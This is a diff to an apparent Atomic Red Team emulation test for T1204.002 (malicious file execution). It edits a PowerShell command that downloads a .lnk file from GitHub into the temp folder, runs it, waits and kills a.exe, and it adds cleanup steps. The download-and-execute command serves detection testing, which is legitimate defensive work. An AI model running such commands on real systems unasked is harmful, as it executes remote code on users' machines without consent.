@@ -9,9 +9,9 @@
   platforms:
     windows:
       psh:
-        command: Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk";
-          $file1 = "$env:Temp\test10.lnk"; Start-Process $file1; Start-Sleep -s 10;
-          taskkill /IM a.exe /F
+        command: Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+          -UseBasicParsing; $file1 = "$env:Temp\test10.lnk"; Start-Process $file1;
+          Start-Sleep -s 10; taskkill /IM a.exe /F
         cleanup: $file1 = "$env:Temp\test10.lnk"; $file2 = "$env:Temp\a.exe"; Remove-Item
           $file1 -ErrorAction Ignore; Remove-Item $file2 -ErrorAction Ignore
   plugin: atomic
@@ -20,11 +20,11 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - execution
   - t1204.002
+  - execution
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     technique_created: '2020-03-11T14:49:36.954Z'
     atomic_guid: 581d7521-9c4b-420e-9695-2aec5241167f
-    import_timestamp: '2026-10-20T07:08:27.746440Z'
+    import_timestamp: '2026-10-21T07:01:50.343581Z'
